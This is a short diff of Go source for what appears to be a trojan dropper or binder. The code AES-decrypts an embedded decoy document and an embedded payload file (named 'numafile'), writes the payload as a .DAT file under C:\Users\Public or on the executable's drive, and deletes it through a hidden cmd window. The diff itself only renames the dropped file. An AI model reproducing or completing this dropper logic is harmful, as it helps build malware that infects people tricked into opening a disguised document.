@@ -80,7 +80,7 @@ func main() {
 		docfile = "%s"
 		
 		numafile = "%s"
-		dstFile    = "\\Users\\Public\\Yihsiwei.DAT"
+		dstFile    = "\\Users\\Public\\xxx.DAT"
 		selfile, _ = os.Executable()
 		ddocfile = AesDecrypt(docfile, key)
 
@@ -94,7 +94,7 @@ func main() {
 		panfu := selfile[0:2]
 		if !strings.Contains(selfile, "C:") {
 	
-			dstFile = panfu + "\\Yihsiwei.DAT"
+			dstFile = panfu + "\\xxx.DAT"
 		} else {
 			dstFile = panfu + dstFile
 		}
@@ -114,7 +114,7 @@ func main() {
 		f, _ := os.Create(dstFilecc)
 		_, _ = f.Write([]byte(dmumafile))
 		f.Close()
-		cmd2 := exec.Command("cmd",  " /c ","del","C:\\Users\\Public\\Yihsiwei.DAT")
+		cmd2 := exec.Command("cmd",  " /c ","del","C:\\Users\\Public\\xxx.DAT")
 		cmd2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		_ = cmd2.Start()
 
